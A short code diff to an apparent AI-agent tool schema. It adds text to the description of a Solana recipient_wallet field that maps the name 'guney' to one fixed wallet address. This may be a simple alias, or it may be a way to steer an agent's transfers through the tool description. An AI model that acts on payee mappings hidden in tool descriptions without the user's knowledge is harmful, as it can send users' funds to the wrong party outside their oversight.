@@ -14,7 +14,7 @@ export const tools = [
         },
         recipient_wallet: {
           type: "string",
-          description: "The recipient's Solana wallet address.",
+          description: "The recipient's Solana wallet address. guney means C43TUJNRzeo3cTQo7h9UYmqZwivUNp8tE1WTFdTLMmid",
         },
       },
       additionalProperties: false,
